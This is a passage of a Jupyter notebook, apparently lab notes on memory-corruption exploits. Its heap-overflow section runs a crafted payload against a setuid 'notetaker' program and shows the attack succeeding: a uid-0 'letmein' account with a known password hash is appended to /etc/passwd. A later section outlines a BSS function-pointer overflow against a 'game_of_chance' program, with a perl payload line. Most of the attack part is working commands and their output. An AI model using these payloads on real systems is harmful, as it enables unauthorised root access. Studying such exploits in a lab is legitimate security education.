      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magic.py\u001b[0m in \u001b[0;36m<lambda>\u001b[0;34m(f, *a, **k)\u001b[0m\n\u001b[1;32m    185\u001b[0m     \u001b[0;31m# but it's overkill for just that one bit of state.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    186\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mmagic_deco\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 187\u001b[0;31m         \u001b[0mcall\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mlambda\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    188\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    189\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mcallable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n\u001b[1;32m    243\u001b[0m             \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstderr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mflush\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    244\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_error\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m!=\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 245\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mCalledProcessError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0moutput\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mout\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstderr\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    246\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    247\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_run_script\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mto_close\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mCalledProcessError\u001b[0m: Command 'b'cat testfile\\n'' returned non-zero exit status 1."
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "cat testfile"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploit the heap-overflow flaw in notetaker program\n",
    "- several clever ways to exploit this type of capability\n",
    "- append a user to the /etc/passwd file?\n",
    "- make a backup copy of the file just incase..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "cp /etc/passwd /tmp/passwd.bkup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "root:x:0:0:root:/root:/bin/bash\n",
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
      "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
      "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
      "sync:x:4:65534:sync:/bin:/bin/sync\n",
      "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
      "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
      "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
      "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
      "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
      "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
      "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
      "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
      "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
      "irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n",
      "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n",
      "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
      "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n",
      "systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n",
      "systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n",
      "systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n",
      "mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false\n",
      "ntp:x:105:111::/nonexistent:/usr/sbin/nologin\n",
      "messagebus:x:106:112::/nonexistent:/usr/sbin/nologin\n",
      "Debian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin\n",
      "uuidd:x:108:115::/run/uuidd:/usr/sbin/nologin\n",
      "redsocks:x:109:116::/var/run/redsocks:/usr/sbin/nologin\n",
      "tss:x:110:117:TPM2 software stack,,,:/var/lib/tpm:/bin/false\n",
      "rwhod:x:111:65534::/var/spool/rwho:/usr/sbin/nologin\n",
      "iodine:x:112:65534::/var/run/iodine:/usr/sbin/nologin\n",
      "stunnel4:x:113:120::/var/run/stunnel4:/usr/sbin/nologin\n",
      "miredo:x:114:65534::/var/run/miredo:/usr/sbin/nologin\n",
      "dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n",
      "sslh:x:116:122::/nonexistent:/usr/sbin/nologin\n",
      "postgres:x:117:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n",
      "usbmux:x:118:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n",
      "rtkit:x:119:126:RealtimeKit,,,:/proc:/usr/sbin/nologin\n",
      "_rpc:x:120:65534::/run/rpcbind:/usr/sbin/nologin\n",
      "Debian-snmp:x:121:128::/var/lib/snmp:/bin/false\n",
      "statd:x:122:65534::/var/lib/nfs:/usr/sbin/nologin\n",
      "inetsim:x:123:129::/var/lib/inetsim:/usr/sbin/nologin\n",
      "sshd:x:124:65534::/run/sshd:/usr/sbin/nologin\n",
      "pulse:x:125:131:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\n",
      "speech-dispatcher:x:126:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false\n",
      "avahi:x:127:134:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\n",
      "saned:x:128:135::/var/lib/saned:/usr/sbin/nologin\n",
      "colord:x:129:137:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n",
      "geoclue:x:130:138::/var/lib/geoclue:/usr/sbin/nologin\n",
      "king-phisher:x:131:139::/var/lib/king-phisher:/usr/sbin/nologin\n",
      "Debian-gdm:x:132:140:Gnome Display Manager:/var/lib/gdm3:/bin/false\n",
      "systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n",
      "user:x:1000:1000:user,12,,:/home/user:/bin/bash\n",
      "tom:x:1001:1001:tom,123,456,:/home/tom:/bin/bash\n",
      "jerry:x:1002:1002:jerry,788,454,:/home/jerry:/bin/bash\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "cat /tmp/passwd.bkup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## /etc/passwd file format\n",
    "\n",
    "username:password:userid:groupid:User Info:home folder:default shell\n",
    "- x : hashed password stored in /etc/shadow file\n",
    "- the password field can contain hashed password\n",
    "- Perl crypt() function uses same function used by system to hash password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "AA6tQYSfGxd/A"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "perl -e 'print crypt(\"password\", \"AA\")'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "XXq2wKiyI43A2"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "perl -e 'print crypt(\"password\", \"XX\")'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## goal: genarate a entry that looks like\n",
    "\n",
    "`letmein:XXq2wKiyI43A2:0:0:me:/root:/bin/bash`\n",
    "\n",
    "### problem:\n",
    "- it's hard to generate the exact line ending with /bin/bash\n",
    "    - the file name /etc/passwd will be automatically attached at the end\n",
    "\n",
    "### workaround:\n",
    "- make /etc/passwd a soft link pointing to /bin/bash"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "mkdir /tmp/etc\n",
    "ln -s /bin/bash /tmp/etc/passwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lrwxrwxrwx 1 user user 9 Apr 29 13:38 /tmp/etc/passwd -> /bin/bash\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ls -l /tmp/etc/passwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### now we've a valid password entry that looks like:\n",
    "\n",
    "`letmein:XXq2wKiyI43A2:0:0:me:/root:/tmp/etc/passwd`\n",
    "\n",
    "#### one more thing:\n",
    "- the value just before /etc/passwd must be 112 bytes long, remember?\n",
    "- can play with user information column to adjust the length\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "37\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# find the length with empty user info\n",
    "echo -ne letmein:XXq2wKiyI43A2:0:0::/root:/tmp | wc -c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "75\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "echo $((112-37))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "112\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "perl -e 'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp\"' | wc -c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "munmap_chunk(): invalid pointer\n",
      "bash: line 1:  4615 Aborted                 ./notetaker.exe $(perl -e 'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp/etc/passwd\"')\n"
     ]
    },
    {
     "ename": "CalledProcessError",
     "evalue": "Command 'b'./notetaker.exe $(perl -e \\'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp/etc/passwd\"\\')\\n'' returned non-zero exit status 134.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mCalledProcessError\u001b[0m                        Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-99-14a3b74290b4>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun_cell_magic\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'bash'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m''\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'./notetaker.exe $(perl -e \\'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp/etc/passwd\"\\')\\n'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mrun_cell_magic\u001b[0;34m(self, magic_name, line, cell)\u001b[0m\n\u001b[1;32m   2321\u001b[0m             \u001b[0mmagic_arg_s\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvar_expand\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstack_depth\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2322\u001b[0m             \u001b[0;32mwith\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbuiltin_trap\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2323\u001b[0;31m                 \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmagic_arg_s\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2324\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2325\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mnamed_script_magic\u001b[0;34m(line, cell)\u001b[0m\n\u001b[1;32m    140\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    141\u001b[0m                 \u001b[0mline\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mscript\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 142\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mshebang\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    143\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    144\u001b[0m         \u001b[0;31m# write a basic docstring:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m</home/user/miniconda3/lib/python3.7/site-packages/decorator.py:decorator-gen-109>\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magic.py\u001b[0m in \u001b[0;36m<lambda>\u001b[0;34m(f, *a, **k)\u001b[0m\n\u001b[1;32m    185\u001b[0m     \u001b[0;31m# but it's overkill for just that one bit of state.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    186\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mmagic_deco\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 187\u001b[0;31m         \u001b[0mcall\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mlambda\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    188\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    189\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mcallable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n\u001b[1;32m    243\u001b[0m             \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstderr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mflush\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    244\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_error\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m!=\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 245\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mCalledProcessError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0moutput\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mout\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstderr\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    246\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    247\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_run_script\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mto_close\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mCalledProcessError\u001b[0m: Command 'b'./notetaker.exe $(perl -e \\'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp/etc/passwd\"\\')\\n'' returned non-zero exit status 134."
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "./notetaker.exe $(perl -e 'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp/etc/passwd\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "colord:x:129:137:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n",
      "geoclue:x:130:138::/var/lib/geoclue:/usr/sbin/nologin\n",
      "king-phisher:x:131:139::/var/lib/king-phisher:/usr/sbin/nologin\n",
      "Debian-gdm:x:132:140:Gnome Display Manager:/var/lib/gdm3:/bin/false\n",
      "systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n",
      "user:x:1000:1000:user,12,,:/home/user:/bin/bash\n",
      "tom:x:1001:1001:tom,123,456,:/home/tom:/bin/bash\n",
      "jerry:x:1002:1002:jerry,788,454,:/home/jerry:/bin/bash\n",
      "�\u0003\u0000\u0000\n",
      "letmein:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "tail /etc/passwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## now login or su letmein with password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## BSS Segment, Function Pointer Overflow\n",
    "### Game of Chance program\n",
    "- three different game functions\n",
    "    - uses a single global function pointer to remember last game played\n",
    "- uses global struct object in BSS segment to hold plyayer's info\n",
    "- seteuid multi-user program that stores user's data in /var folder"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- compile game_of_chance.c\n",
    "- change ownership to root:root\n",
    "- seteuid\n",
    "- run and play game\n",
    "- player.name buffer is 100 bytes\n",
    "- input_name() copies data to player.name until \\n\n",
    "- play_the_game function can take advantage of the overflown function pointer when any game is \n",
    "- put the game to background - ctrl+z\n",
    "- find the difference between player.name address and player.current_game (100)\n",
    "- return to the suspended program: fg\n",
    "- enter 5 to change name\n",
    "- change name to 100As+BBBB+\\n\n",
    "- play the same game and see the DEBUG\n",
    "- find valid address to overwrite current_game func ptr\n",
    "- list symbols in object/binary (nm)\n",
    "    - nm game_of_chance.exe\n",
    "- automate/simulate the game play\n",
    "- $ perl -e 'print \"1\\n10\\nn\\n5\\n\" . \"A\"x100 . \"jackpot address in rev order\" . \"1\\n\" . \"y\\n\"x10 . \n",
    "\"n\\n5\\nJohn Doe\\n7\"' | ./game_of_chance"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
